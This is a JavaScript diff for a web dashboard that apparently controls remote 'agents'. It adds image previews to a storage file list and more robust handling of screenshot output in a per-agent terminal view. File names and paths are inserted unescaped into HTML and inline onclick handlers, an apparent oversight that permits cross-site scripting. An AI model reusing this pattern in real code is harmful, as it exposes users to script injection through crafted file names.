@@ -371,17 +371,25 @@ function renderFileList(files) {
         return '<div class="no-files">No files found</div>';
     }
 
-    return files.map(file => `
+    return files.map(file => {
+        const isImage = file.name.match(/\.(jpg|jpeg|png|gif)$/i);
+        const previewButton = isImage ? `
+            <button onclick="previewFile('${file.path}')" title="Preview">
+                <span class="material-icons">visibility</span>
+            </button>` : '';
+
+        return `
         <div class="file-item" data-path="${file.path}">
             <div class="file-info">
                 <span class="file-name">
-                    <span class="material-icons">description</span>
+                    <span class="material-icons">${isImage ? 'image' : 'description'}</span>
                     ${file.name}
                 </span>
                 <span class="file-size">${formatFileSize(file.size)}</span>
                 <span class="file-date">${formatDate(file.modified)}</span>
             </div>
             <div class="file-actions">
+                ${previewButton}
                 <button onclick="downloadStorageFile('${file.path}')" title="Download">
                     <span class="material-icons">download</span>
                 </button>
@@ -390,7 +398,8 @@ function renderFileList(files) {
                 </button>
             </div>
         </div>
-    `).join('');
+    `;
+    }).join('');
 }
 
 function formatFileSize(bytes) {
@@ -973,7 +982,14 @@ function takeScreenshot(agentId) {
         if (data.error) {
             appendToTerminal(data.error, 'error', agentId);
         } else {
-            appendToTerminal(data.output, 'success', agentId);
+            // Handle the response output properly
+            const output = data.output || data.message || '';
+            if (typeof output === 'object') {
+                appendToTerminal(JSON.stringify(output, null, 2), 'success', agentId);
+            } else {
+                appendToTerminal(output, 'success', agentId);
+            }
+            
             // Refresh storage view if we're on the storage tab
             if (document.querySelector('[data-tab="storage"]').classList.contains('active')) {
                 updateStorage();
@@ -982,5 +998,28 @@ function takeScreenshot(agentId) {
     })
     .catch(error => {
         appendToTerminal(`Error taking screenshot: ${error.message}`, 'error', agentId);
+    });
+}
+
+// Add preview functionality
+function previewFile(path) {
+    // Create modal for image preview
+    const modal = document.createElement('div');
+    modal.className = 'preview-modal';
+    modal.innerHTML = `
+        <div class="preview-content">
+            <img src="/api/preview_file?path=${encodeURIComponent(path)}" alt="Preview">
+            <button class="close-preview" onclick="this.parentElement.parentElement.remove()">
+                <span class="material-icons">close</span>
+            </button>
+        </div>
+    `;
+    document.body.appendChild(modal);
+
+    // Close on click outside
+    modal.addEventListener('click', (e) => {
+        if (e.target === modal) {
+            modal.remove();
+        }
     });
 } 
